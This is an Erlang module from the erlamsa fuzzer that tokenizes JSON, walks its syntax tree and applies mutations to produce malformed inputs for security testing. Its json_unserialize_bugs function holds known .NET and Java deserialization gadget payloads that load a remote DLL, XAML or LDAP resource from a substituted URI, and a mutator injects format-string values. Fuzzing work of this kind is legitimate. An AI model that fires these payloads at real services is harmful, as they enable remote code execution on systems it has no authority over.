% Copyright (c) 2014-2018 Alexander Bolshev aka dark_k3y
% Initial implementation was a little slow, so:
% - several optimizations approaches is heavilly based on JSONE implementation
% by Copyright (c) 2013-2016, Takeru Ohta <phjgt308@gmail.com> (MIT LICENSE)
% see https://github.com/sile/jsone/blob/master/src/jsone_decode.erl
% for more details
% Usage of original JSONE was not possible due to the fact, that
% erlamsa should be able to parse badly crafted JSON docs
%
% LICENSE
%
% Permission is hereby granted, free of charge, to any person obtaining a copy
% of this software and associated documentation files (the "Software"), to deal
% in the Software without restriction, including without limitation the rights
% to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
% copies of the Software, and to permit persons to whom the Software is
% furnished to do so, subject to the following conditions:
%
% The above copyright notice and this permission notice shall be included in
% all copies or substantial portions of the Software.
%
% THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
% IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
% FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT
% SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
% DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
% OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR
% THE USE OR OTHER DEALINGS IN THE SOFTWARE.

-module(erlamsa_json).

-author("dark_k3y").

-compile([export_all]).

-ifdef(TEST).
-include_lib("eunit/include/eunit.hrl").
-compile([export_all]).
-endif.

-include("erlamsa.hrl").

%% API
-export([tokenize/1, tokens_to_erlang/1]).

-define(NOT_SEPARATOR(C),
        C =/= $ , C =/= $\n, C =/= $\r, C =/= $\t, C =/= $,, C =/= $], C =/= $}, C =/= $:).

%% TODO: add specs

%%%
%%% Generic functions
%%%

fold_list(F, [H], Acc) ->
    R = F(H),
    fold_list(F, [], [R | Acc]);
fold_list(F, [H|T], Acc) ->
    R = F(H),
    fold_list(F, T, [[R, $,] | Acc]);
fold_list(_F, [], Acc) ->
    lists:reverse(Acc).

%%%
%%% /Generic functions
%%%

%%%
%%% JSON tokenizer
%%%

% Grammar derived from https://tools.ietf.org/html/rfc7159
% document: ws value ws
% ws : \x20 | \t | \r | \n
% value: string | number | object | array | true | false | null
% elements: value | value ws , ws elements
% array: ws [ ws ] | ws [ ws elements ws ]
% object: ws { ws }  | ws { ws members ws }
% members: pair | pair ws , ws members
% pair: string : value

%% document is a ws
tokenize(Bin) ->
    lists:reverse(ws(Bin, [value], [])).

ws(<<$\t, Rest/binary>>, Context, Acc) -> ws(Rest, Context, Acc);
ws(<<$\n, Rest/binary>>, Context, Acc) -> ws(Rest, Context, Acc);
ws(<<$\r, Rest/binary>>, Context, Acc) -> ws(Rest, Context, Acc);
ws(<<$  , Rest/binary>>, Context, Acc) -> ws(Rest, Context, Acc);
ws(<<>>, _, Acc) -> Acc;
ws(Bin, Context = [Term|RestContext], Acc) ->
    %io:format("111111 ~p~n", [Bin]),
    case Term of
        array ->                array(Bin, [array_end|RestContext], Acc);
        {elements, List} ->     elements(Bin, RestContext, List, Acc);
        object ->               object(Bin, [object_end|RestContext], Acc);
        {members, Pairs} ->     members(Bin, RestContext, Pairs, Acc);
        pair ->                 pair(Bin, RestContext, Acc);
        pair_delim ->           pair(Bin, Context, Acc);
        value ->                value(Bin, RestContext, Acc)
    end;
ws(_, _, _) -> throw(incorrect_json).

value(<<$[, Rest/binary>>, Context, Acc) ->
    ws(Rest, [array|Context], Acc);
value(<<${, Rest/binary>>, Context, Acc) ->
    ws(Rest, [object|Context], Acc);
value(<<"true", Rest/binary>>, Context, Acc) ->
    push(Rest, Context, {constant, true}, Acc);
value(<<"false", Rest/binary>>, Context, Acc) ->
    push(Rest, Context, {constant, false}, Acc);
value(<<"null", Rest/binary>>, Context, Acc) ->
    push(Rest, Context, {constant, null}, Acc);
value(<<$", Rest/binary>>, Context, Acc) ->
    string(Rest, Context, [], Acc);
value(Bin, Context, Acc) ->
    number(Bin, Context, Acc).

%% Arrays
array(<<$], Rest/binary>>, [array_end|Context],  Acc) ->
    %io:format("0]~n"),
    push(Rest, Context, {array, []}, Acc);
array(Bin, Context, Acc) ->
    ws(Bin, [value, {elements, []}|Context], Acc).

elements(<<$], Rest/binary>>, [array_end|Context], List, Acc) ->
    %io:format("1]~n"),
    push(Rest, Context, {array, lists:reverse(List)}, Acc);
elements(<<$,, Rest/binary>>, Context, List, Acc) ->
    ws(Rest, [value, {elements, List}|Context], Acc);
elements(<<_C:8, _Rest/binary>>, _Context, _List, _Acc) ->
    throw(incorrect_json).

%% Objects
object(<<$}, Rest/binary>>, [object_end|Context],  Acc) ->
    %io:format("mmmmmm~n"),
    push(Rest, Context, {object, []}, Acc);
object(Bin, Context, Acc) ->
    ws(Bin, [pair, {members, []}|Context], Acc).

members(<<$}, Rest/binary>>, [object_end|Context], Pairs, Acc) ->
    %io:format("nnnnnnnnn ~p~n", [{Rest, [value|Context], [{object, lists:reverse(Pairs)}|Acc]}]),
    push(Rest, Context, {object, lists:reverse(Pairs)}, Acc);
members(<<$,, Rest/binary>>, Context, Pairs, Acc) ->
    ws(Rest, [pair, {members, Pairs}|Context], Acc);
members(<<_C:8, _Rest/binary>>, _Context, _Pairs, _Acc) ->
    throw(incorrect_json).

pair(<<$:, Rest/binary>>, [pair_delim | Context], Acc) ->
    %io:format("1: ~p~n", [{Rest, Context, Acc}]),
    ws(Rest, [value, pair_end | Context], Acc);
pair(Bin, Context, Acc) ->
    %io:format("2: ~p~n", [{Bin, Context, Acc}]),
    ws(Bin, [value, pair_delim | Context], Acc).

%% Primitive values parsing
push(Bin, [], Value, Acc) ->
    ws(Bin, [], [Value|Acc]);
push(Bin, [{elements, List} | Context], Value, Acc) ->
    %io:format("!!!!~p, ~p, ~p~n", [Bin, [{elements, [Value|List]} | Context], Acc]),
    ws(Bin, [{elements, [Value|List]} | Context], Acc);
push(Bin, [{members, List} | Context], Value, Acc) ->
    %io:format("!!!!~p, ~p, ~p~n", [Bin, [{members, [Value|List]} | Context], Acc]),
    ws(Bin, [{members, [Value|List]} | Context], Acc);
push(Bin, [pair_delim | Context], Key, Acc) ->
    ws(Bin, [pair_delim, {pair_start, Key} | Context], Acc);
push(Bin, [pair_end, {pair_start, Key} | Context], Value, Acc) ->
    push(Bin, Context, {pair, Key, Value}, Acc);
push(_, _, _, _) -> throw(incorrect_json).


%% TODO: more effective way to handle big strings
%% this may be slow in some cases
string(<<$", Rest/binary>>, Context, RevStr, Acc) ->
    push(Rest, Context, {string, lists:reverse(RevStr)}, Acc);
string(<<C:8, Rest/binary>>, Context, RevStr, Acc) ->
    string(Rest, Context, [C|RevStr], Acc);
string(<<>>, Context, RevStr, Acc) ->
    push(<<>>, Context, {junkstring, lists:reverse([$"|RevStr])}, Acc).

number(<<C:8, Rest/binary>>, Context, Acc) when ?NOT_SEPARATOR(C) ->
    number_rest(Rest, Context, [C], Acc);
number(_, _, _) -> throw(incorrect_json).

number_rest(<<C:8, Rest/binary>>, Context, N, Acc) when ?NOT_SEPARATOR(C) ->
    number_rest(Rest, Context, [C|N], Acc);
number_rest(Bin, Context, N, Acc) ->
    push(Bin, Context, {number, lists:reverse(N)}, Acc).

%%%
%%% /JSON tokenizer
%%%

%%%
%%% JSON AST -> Erlang dictionaries
%%%

tokens_to_erlang(Ast) when is_list(Ast) ->
    lists:map(fun tokens_to_erlang/1, Ast);
tokens_to_erlang({object, Lst}) ->
    Pairs = lists:map(fun tokens_to_erlang/1, Lst),
    lists:foldl(fun ({Key, Value}, Acc) -> maps:put(Key, Value, Acc) end,
                maps:new(), Pairs);
tokens_to_erlang({array, Lst}) ->
    lists:map(fun tokens_to_erlang/1, Lst);
tokens_to_erlang({pair, Key, Value}) ->
    {tokens_to_erlang(Key), tokens_to_erlang(Value)};
tokens_to_erlang({string, Value}) ->
    Value;
%% TODO: nested try/catch, fix me:
tokens_to_erlang({number, Value}) ->
    try list_to_integer(Value) of
        Int -> Int
    catch error:badarg ->
        try list_to_float(Value) of
            Float -> Float
        catch error:badarg ->
            invalid_number
        end
    end;
tokens_to_erlang(Token) ->
    Token.

%%%
%%% /JSON AST -> Erlang dictionaries
%%%

%%%
%%% JSON AST Folder
%%%

%% TODO: beautify parameter to insert ' ' and '\n'

%% handle incorrect AST that could appear during mutations
fold_ast_noarray(H, Acc) when is_list(H), length(H) > 1 ->
    M = fold_list(fun (A) -> fold_ast(A, []) end, H, []),
    fold_ast([], [M | Acc]);
fold_ast_noarray(H, Acc) ->
    fold_ast(H, Acc).

fold_ast([H], Acc) ->
    fold_ast(H, Acc);
fold_ast({pair, P1, P2}, Acc) -> 
    P1Json = fold_ast(P1, []),
    P2Json = fold_ast(P2, []),
    [P1Json, ":", P2Json | Acc];
fold_ast({junkstring, Value}, Acc) -> 
    [$", Value, $" | Acc];
fold_ast({string, Value}, Acc) -> 
    [$", Value, $" | Acc];
fold_ast({constant, Value}, Acc) when is_atom(Value) -> 
    [atom_to_list(Value) | Acc];
fold_ast({number, Value}, Acc) ->
    [Value | Acc];
fold_ast({object, Els}, Acc) -> 
    ["{", fold_ast_noarray(Els, []), "}" | Acc];
fold_ast({array, Els}, Acc) -> 
    ["[", fold_ast_noarray(Els, []), "]" | Acc];
fold_ast([], Acc) -> 
    lists:flatten(Acc);
%% handle incorrect AST that could appear during mutations
fold_ast(H, Acc) when is_list(H), length(H) > 1 ->
    M = fold_list(fun (A) -> fold_ast(A, []) end, H, []),
    fold_ast([], ["[", M, "]" | Acc]).
%% if binary, nothing to do here
fold_ast(Binary) when is_binary(Binary) ->
    Binary;
%% default
fold_ast(Ast) ->
    list_to_binary(lists:flatten(fold_ast(Ast, []))).

%%%
%%% /JSON AST Folder
%%%

%%%
%%% JSON AST utils
%%%

walk_reverse(L) when is_list(L) -> lists:reverse(L);
walk_reverse(L) -> L.

walk_uncons1(L) when is_list(L), length(L) =:= 1 -> hd(L);
walk_uncons1(L) -> L.

walk(WalkType, Ast, Fun, InitAcc) ->
    WalkPairs = case WalkType of 
        all -> 
            fun (Walker, El1, El2, Acc, CountT, Count) ->
                {ChildAcc1, ChildTagCnt1, ChildCnt1} = Walker(El1, {InitAcc, CountT, Count + 1}),
                {ChildAcc2, ChildTagCnt2, ChildCnt2} = Walker(El2, {InitAcc, ChildTagCnt1, ChildCnt1}),
                {Fun({pair, walk_uncons1(walk_reverse(ChildAcc1)), 
                            walk_uncons1(walk_reverse(ChildAcc2))}, Acc, CountT, Count + 1), ChildTagCnt2, ChildCnt2}
            end;
        pairs ->
            fun (Walker, El1, El2, Acc, CountT, Count) ->
                {ChildAcc2, ChildTagCnt2, ChildCnt2} = Walker(El2, {InitAcc, CountT, Count + 1}),
                {Fun({pair, El1, 
                            walk_uncons1(walk_reverse(ChildAcc2))}, Acc, CountT, Count + 1), ChildTagCnt2, ChildCnt2}
            end
    end,            
    {Res, ResT, ResN} = lists:foldl(
        fun
            Walker({Type, Els}, {Acc, CountT, Count}) when Type =:= object; Type =:= array ->
                %io:format("Object or Array: ~p : ~p~n", [{Type, Els}, {Acc, Count}]),
                {ChildAcc, ChildTagCnt, ChildCnt} = Walker(Els, {InitAcc, CountT + 1, Count + 1}),
                {Fun({Type, walk_reverse(ChildAcc)}, Acc, CountT + 1, Count + 1), ChildTagCnt, ChildCnt};
            Walker({pair, El1, El2}, {Acc, CountT, Count}) ->
                %io:format("Pair: ~p : ~p~n", [{pair, El1, El2}, {Acc, Count}]),
                WalkPairs(Walker, El1, El2, Acc, CountT, Count);
            Walker(El, {Acc, CountT, Count}) when is_list(El) ->
                %io:format("List: ~p : ~p~n", [El, {Acc, Count}]),
                lists:foldl(fun(A, B) -> Walker(A, B) end, {Acc, CountT, Count}, El);
            Walker(Elem, {Acc, CountT, Count}) ->
                %io:format("Single elem: ~p : ~p~n", [Elem, {Acc, Count}]),
                {Fun(Elem, Acc, CountT, Count + 1), CountT, Count + 1}
        end,
        {InitAcc, 0, 0}, Ast),
    {walk_reverse(Res), ResT, ResN}.

walk2acc(Ast, Fun, InitAcc) ->
    {Res, Res2} = lists:foldl(
        fun
            Walker({Type, Els}, {Acc, Acc2}) when Type =:= object; Type =:= array ->
                %io:format("Object or Array: ~p : ~p~n", [{Type, Els}, {Acc, Count}]),
                {ChildAcc, ChildAcc2} = Walker(Els, InitAcc),
                {UAcc, UAcc2} = Fun({Type, walk_reverse(ChildAcc)}, Acc, Acc2),
                {UAcc, [ChildAcc2|UAcc2]};
            Walker({pair, El1, El2}, {Acc, Acc2}) ->
                %io:format("Pair: ~p : ~p~n", [{pair, El1, El2}, {Acc, Count}]),
                {ChildAcc1, ChildAcc12} = Walker(El1, InitAcc),
                {ChildAcc2, ChildAcc22} = Walker(El2, InitAcc),
                {UAcc, UAcc2} = Fun({pair, walk_uncons1(walk_reverse(ChildAcc1)), 
                                           walk_uncons1(walk_reverse(ChildAcc2))}, Acc, Acc2),
                {UAcc, [ChildAcc12, ChildAcc22 | UAcc2]};
            Walker(El, Acc) when is_list(El) ->
                %io:format("List: ~p : ~p~n", [El, {Acc, Count}]),
                lists:foldl(fun(A, B) -> Walker(A, B) end, Acc, El);
            Walker(Elem, {Acc, Acc2}) ->
                %io:format("Single elem: ~p : ~p~n", [Elem, {Acc, Count}]),
                Fun(Elem, Acc, Acc2)
        end,
        InitAcc, Ast),
    {walk_reverse(Res), lists:reverse(lists:flatten(Res2))}.

select(WalkType, Ast, Fun) ->
    WalkPairs = case WalkType of 
        all -> 
            fun (Walker, El1, El2, Acc, CountT, Count) ->
                case Walker(El1, {Acc, CountT, Count + 1}) of
                    {false, ChildTagCnt1, ChildCnt1} ->
                        case Walker(El2, {Acc, ChildTagCnt1, ChildCnt1}) of
                            {false, ChildTagCnt2, ChildCnt2} -> 
                                {Acc, ChildTagCnt2, ChildCnt2};
                            Res2 -> Res2
                        end;
                    Res1 -> Res1
                end
            end;
        values -> 
            fun (Walker, _El1, El2, Acc, CountT, Count) ->
                case Walker(El2, {Acc, CountT, Count + 1}) of
                    {false, ChildTagCnt2, ChildCnt2} -> 
                        {Acc, ChildTagCnt2, ChildCnt2};
                    Res2 -> Res2
                end
            end
    end, 
    lists:foldl(
        fun
            Walker(El = {Type, Els}, {Acc, CountT, Count}) when Type =:= object; Type =:= array ->
                case Fun(El, CountT + 1, Count + 1) of
                    false -> 
                        Walker(Els, {Acc, CountT + 1, Count + 1});
                    Res -> 
                        {Res, CountT + 1, Count + 1}
                end;
            Walker(El = {pair, El1, El2}, {Acc, CountT, Count}) ->
                case Fun(El, CountT, Count + 1) of
                    false ->
                        WalkPairs(Walker, El1, El2, Acc, CountT, Count);
                    Res -> {Res, CountT, Count + 1}
                end;
            Walker(El, {Acc, CountT, Count}) when is_list(El) ->
                lists:foldl(fun(A, B) -> Walker(A, B) end, {Acc, CountT, Count}, El);
            Walker(Elem, {Acc, CountT, Count}) ->
                case Fun(Elem, CountT, Count + 1) of 
                    false -> {Acc, CountT, Count + 1};
                    Res -> {Res, CountT, Count + 1}
                end
        end,
        {false, 0, 0}, Ast).

test_walk(Ast) ->
    walk(all, Ast,
        fun  (E, Acc, _, _N) ->
            %io:format("~p is ~w~n", [E, N]),
            [E|Acc] 
        end,
        []).

count(Ast) ->
    walk(all, Ast,
        fun
            ({Type, Els}, Acc, _, _N) when Type =:= object; Type =:= array ->
                Els + Acc + 1;
            ({pair, _El1, El2}, Acc, _, _N) ->
                Acc + El2 + 1;
            (_E, Acc, _, _N) ->
                Acc + 1
        end, 0).

select_elem(SelectType, Ast, N) ->
    {Res, _, _} = select(SelectType, Ast,
            fun
                (Elem, _, I) when I =:= N ->
                    {Elem, I};
                (_Elem, _, _I) ->
                    false
            end),
    Res.

select_tag(SelectType, Ast, N) ->
    {Res, _, _} = select(SelectType, Ast,
            fun
                ({object, _} = Elem, I, C) when I =:= N ->
                    {Elem, I, C};                
                ({array, _} = Elem, I, C) when I =:= N ->
                    {Elem, I, C};                
                (_, _, _) ->
                    false
            end),
    Res.


replace_elem(Ast, R, El) ->
    walk(all, Ast,
        fun
            (_Elem, Tree, _, I) when I == R ->
                [El | Tree];
            (Elem, Tree, _, _I) ->
                [Elem | Tree]
        end, []).

repeat_listhd(L, N) when N < 1 ->
    L;
repeat_listhd([H | T], N) ->
    repeat_listhd([H, H | T], N - 1).

repeat_elem(Ast, R, Times) ->
    walk(pairs, Ast,
        fun
            (Elem, Tree, _, I) when I == R ->
                repeat_listhd([Elem | Tree], Times);
            (Elem, Tree, _, _I) ->
                [Elem | Tree]
        end, []).

insert_elem(Ast, R, NewElem) ->
    walk(pairs, Ast,
        fun
            (Elem, Tree, _, I) when I == R ->
                [NewElem, Elem | Tree];
            (Elem, Tree, _, _I) ->
                [Elem | Tree]
        end, []).

%%%
%%% /JSON AST utils
%%%

%%%
%%% JSON AST -> Erlang simple structs
%%%

tokens_to_simpleast(Ast) when is_list(Ast) ->
    lists:map(fun tokens_to_simpleast/1, Ast);
tokens_to_simpleast({object, Lst}) ->
    {lists:map(fun tokens_to_simpleast/1, Lst)};
tokens_to_simpleast({array, Lst}) ->
    lists:map(fun tokens_to_simpleast/1, Lst);
tokens_to_simpleast({pair, Key, Value}) ->
    {tokens_to_simpleast(Key), tokens_to_simpleast(Value)};
tokens_to_simpleast({string, Value}) ->
    {string, Value};
tokens_to_simpleast({number, Value}) ->
    try list_to_integer(Value) of
        Int -> Int
    catch error:badarg ->
        try list_to_float(Value) of
            Float -> Float
        catch error:badarg ->
            invalid_number
        end
    end;
tokens_to_simpleast(Token) ->
    Token.

%%%
%%% /JSON AST -> Erlang simple structs
%%%


%%%
%%% JSON Simple AST Folder
%%%

fold_simpleast(H, Acc) when is_list(H) ->
    lists:flatten([$[, fold_list(fun (A) -> fold_simpleast(A, []) end, H, []), $] | Acc]);
fold_simpleast({H}, Acc) when is_list(H) ->
    lists:flatten([${, fold_list(fun (A) -> fold_simpleast(A, []) end, H, []), $} | Acc]);
fold_simpleast({string, A}, Acc) ->
    lists:flatten([$", A, $" | Acc]);
fold_simpleast({A, B}, Acc) ->
    lists:flatten([fold_simpleast(A, Acc), $:, fold_simpleast(B, Acc) | Acc]);
fold_simpleast(A, Acc) when is_integer(A);is_float(A) ->
    [lists:flatten(io_lib:format("~p", [A])) | Acc];
fold_simpleast([], Acc) ->
    lists:flatten(Acc);
fold_simpleast(A, Acc) ->
    [A | Acc].
%%%
%%% /JSON Simple AST Folder
%%%

%%%
%%% Mutators
%%%

%% TODO: sometimes it creates object: values pairs, FIXME: fix it

pump_path(Start, _End, 0) -> Start;
pump_path(Start, End, N) ->
    %io:format("Pumping... iter ~w start ~w I =  ~w~n", [N, Start, End]),
    {PumpedTag, _, _} = 
        walk(all, [Start],
            fun
                (_Elem, Tree, _, I) when I =:= End ->
                    [Start | Tree];
                (Elem, Tree, _, _) ->
                    [Elem | Tree]
            end, []),
    %io:format("Pumping... iter ~w res ~w~n", [N, PumpedTag]),
    pump_path(hd(PumpedTag), End*2 - 1, N - 1).


json_pump(Ast, 0) -> {Ast, 0, 0};
json_pump(Ast, T) ->
    %io:format("Cnt: ~w ~w~n", [Ast, N]),
    R = erlamsa_rnd:erand(T),
    %io:format("R:!!!!!!!!!!!!!!!!!! ~w~n", [R]),
    {Start, R, StartPlace} = select_tag(all, Ast, R),
    %io:format("Start:!!!!!!!!!!!!!!!!!! ~w ~p ~p~n", [Res, T, R]),
    {_, _, SubElems} = count([Start]),
    %io:format("SubElems:!!!!!!!!!!!!!!!!!! ~w~n", [SubElems]),
    E = erlamsa_rnd:erand(SubElems - 1) + 1, %% not the tag itself
    %io:format("E:!!!!!!!!!!!!!!!!!! ~w~n", [E]),
    %{End, _, _} = select_elem([Start], E),
    %io:format("End:!!!!!!!!!!!!!!!!!! ~w~n", [End]),
    PumpCnt = 2, %erlamsa_rnd:erand( trunc(1000.0/(100.0 + SubElems)) ),
    % ^-- limiting the depth of the pump
    %io:format("PumpCnt:!!!!!!!!!!!!!!!!!! ~w~n", [PumpCnt]),
    Pumped = pump_path(Start, E, PumpCnt),
    %io:format("PUMPED!!!!!!!!!! ~w~n", [Pumped]),
    replace_elem(Ast, StartPlace, Pumped).

json_dup(Ast, N) ->
    R = erlamsa_rnd:erand(N),
    repeat_elem(Ast, R, 1).

json_repeat(Ast, N) ->
    R = erlamsa_rnd:erand(N),
    repeat_elem(Ast, R, erlamsa_rnd:erand(100)).

json_swap(Ast, N) ->
    R1 = erlamsa_rnd:erand(N),
    R2 = erlamsa_rnd:erand(N),
    {Elem1, R1} = select_elem(values, Ast, R1),
    {Elem2, R2} = select_elem(values, Ast, R2),
    walk(pairs, Ast,
        fun
            (_Elem, Tree, _, I) when I == R1 ->
                [Elem2 | Tree];
            (_Elem, Tree, _, I) when I == R2 ->
                [Elem1 | Tree];
            (Elem, Tree, _, _I) ->
                [Elem | Tree]
        end, []).

json_insert(Ast, N) ->
    R1 = erlamsa_rnd:erand(N),
    R2 = erlamsa_rnd:erand(N),
    {NewElem, R1} = select_elem(values, Ast, R1),
    insert_elem(Ast, R2, NewElem).

%%%
%%% /Mutators
%%%

%%%
%%% Mutations
%%%

%% Payloads from Friday the 13th JSON Attacks paper by Alvaro Muñoz & Oleksandr Mirosh HPE Software Security Research
%% from https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
%% and generated by https://github.com/pwntester/ysoserial.net tool
%% Assuming MIT licence (as in https://github.com/pwntester/ysoserial.net/blob/master/LICENSE.txt), 
%% please create an issue if this is incorrect and should be removed due to copyright issues
%% TODO: add more payloads
%% Beginning of payloads from upper links.
json_unserialize_bugs() ->
[
{"{\"__type\":\"System.Windows.Application, PresentationFramework,Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\"Resources\":{\"__type\":\"System.Windows.ResourceDictionary,PresentationFramework, Version=4.0.0.0, Culture=neutral,PublicKeyToken=31bf3856ad364e35\",\"Source\":\"http~sJsonDotNet/Xamlpayload\"}}",1},
{"{\"$type\":\"System.Configuration.Install.AssemblyInstaller,System.Configuration.Install, Version=4.0.0.0, Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a\",\"Path\":\"http~sJsonDotNet/RemoteLibrary.dll\"}",1},
{"{\"$type\":\"System.Windows.Forms.BindingSource, System.Windows.Forms,Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\"DataMember\":\"HelpText\",\"dataSource\":{\"$type\":\"System.Configuration.Install.AssemblyInstalle r, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\",\"Path\":\"http~sJsonDotNet/RemoteLibrary.dll\"}}",1},
{"{\"@class\":\"org.hibernate.jmx.StatisticsService\",\"sessionFactoryJNDIName\":\"ldap~suid=somename,ou=someou,dc=somedc\"}",1},
{"{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap:~suid=somename,ou=someou,dc=somed c\", \"autoCommit\":true}",1},
{"{\"@class\":\" com.atomikos.icatch.jta.RemoteClientUserTransaction\", \"name_\":\"ldap~suid=somename,ou=someou,dc=somedc\", \"providerUrl_\":\"ldap~s\"}",2}
].
%% /End of payloads from upper links.

make_json_unserialize() ->
    Uri = lists:flatten(erlamsa_mutations:get_ssrf_uri()),
    {Payload, Repeats} = erlamsa_rnd:rand_elem(json_unserialize_bugs()),
    list_to_binary(lists:flatten(io_lib:format(Payload, [Uri || _ <- lists:seq(1,Repeats)]))).

mutate_innertext_prob(String, _Muta, Prob, Rnd) when Rnd > Prob ->
    {[], String}; %% No mutations
mutate_innertext_prob(String, Muta, _Prob, _Rnd) ->
    Binary = list_to_binary(String),
    {_NewMuta, NewLstBin, Meta} = Muta([Binary], []),
    %%io:format("res: ~p~n", [{NewLstBin, Meta}]),
    {Meta, binary_to_list(hd(NewLstBin))}.

mutate_null(Rnd, Prob) when Rnd >= Prob -> {constant, null};
mutate_null( _Rnd, _Prob) -> 
    erlamsa_rnd:rand_elem([{number, "-1"}, {number, "1000000000"}, {constant, true}, {array, []}, {string, "%n%s"}, {number, "0"}, {string, "AAAAAAAAAAAA"}]).

%% Prevent too much JSONish on non-JSON data
json_mutation(Ast, {N, 0, NV}) when N < 2 ->
    case {erlamsa_rnd:erand(7), N} of
        {4, 1} -> json_mutation(Ast, {N, 0, NV}, erlamsa_rnd:rand(8));
        _Else -> {[{failed, json}], Ast, -1}
    end;
json_mutation(Ast, {N, NT, NV}) ->
    json_mutation(Ast, {N, NT, NV}, erlamsa_rnd:rand(17)).

json_mutation(Ast, {_N, _NT, NV}, 0) ->
    {Res, _, _} = json_swap(Ast, NV),
    {[{json_swap, 1}], Res, 1};
json_mutation(Ast, {_N, _NT, NV}, 1) ->
    {Res, _, _} = json_dup(Ast, NV),
    {[{json_dup, 1}], Res, 1};
json_mutation(Ast, {_N, NT, _NV}, 2) ->
    {Res, _, _} = json_pump(Ast, NT),
    {[{json_pump, 1}], Res, -2}; %% don't allow too much pumps...
json_mutation(Ast, {_N, _NT, NV}, 3) ->
    {Res, _, _} = json_repeat(Ast, NV),
    {[{json_repeat, 1}], Res, 1};
json_mutation(Ast, {_N, _NT, NV}, 4) ->
    {Res, _, _} = json_insert(Ast, NV),
    {[{json_insert, 1}], Res, 1};
json_mutation(_Ast, {_N, _NT, _NV}, 5) ->
    {[{json_unserialize, 1}], make_json_unserialize(), 1};
json_mutation(Ast, {N, _NT, _NV}, _R) ->  
    Muta = erlamsa_mutations:mutators_mutator(erlamsa_mutations:inner_mutations(json)),
    {Res, Meta} = walk2acc(Ast,
                    fun
                        ({string, String}, Tree, InnerMeta) ->
                            {NewMeta, NewString} = mutate_innertext_prob(String, Muta, 2/N, erlamsa_rnd:rand_float()),
                            {[{string, NewString} | Tree], [NewMeta | InnerMeta]};
                        ({constant, null} = El, Tree, InnerMeta) ->
                            case mutate_null(erlamsa_rnd:rand_float(), 0.1) of
                                El -> {[El | Tree], InnerMeta};
                                NewEl -> {[NewEl | Tree], [{json_innertext, null}, {json_innertext, 1} | InnerMeta]}
                            end;                           
                        ({constant, Boolean} = El, Tree, InnerMeta) ->
                            case erlamsa_mutations:basic_type_mutation(Boolean, 0.1) of 
                                Boolean -> {[El | Tree], InnerMeta};
                                NewBoolean -> {[{constant, NewBoolean} | Tree], [{json_innertext, bool}, {json_innertext, 1} | InnerMeta]}
                            end;
                        ({number, NumberText} = El, Tree, InnerMeta) ->
                            try list_to_integer(NumberText) of
                                Number -> 
                                    case erlamsa_mutations:basic_type_mutation(Number, 0.1) of
                                        Number -> {[El | Tree], InnerMeta};
                                        NewNumber -> {[{number, io_lib:format("~p", [NewNumber])} | Tree], [{json_innertext, num}, {json_innertext, 1} | InnerMeta]}
                                    end
                            catch   
                                error:badarg -> {[El | Tree], InnerMeta}
                            end;    
                        (El, Tree, InnerMeta) ->
                            {[El | Tree], InnerMeta}
                    end, {[], []}),
    {[Meta, {json_innertext,1}], Res, 1};
json_mutation(Ast, _, _) ->
    {[], Ast, -1}.

json_mutate(Ll = [H|T], Meta) ->
    %io:format("Trying to parse... ~p~n", [size(H)]),
    %file:write_file("./last_json.txt", H),
    %% FIXME: count tags while tokenizing?
    try tokenize(H) of
        Tokens ->
            %io:format("count:~p~n", [count(Tokens)]),
            {NV, NT, N} = count(Tokens),
            {NewMeta, Res, D} = json_mutation(Tokens, {N, NT, NV}),
            %io:format("!~p~n", [Res]),
            NewBinStr = fold_ast(Res),
            if
                NewBinStr =:= H ->
                    {fun json_mutate/2, Ll, NewMeta, -1};
                true ->
                    {fun json_mutate/2, [NewBinStr | T],  [NewMeta|Meta], 
                    D + trunc(size(NewBinStr)/(?AVG_BLOCK_SIZE*10))} %% limiting next rounds based on a size
            end
    catch
        incorrect_json ->
            {fun json_mutate/2, Ll, [{failed, json}|Meta], -1}
    end.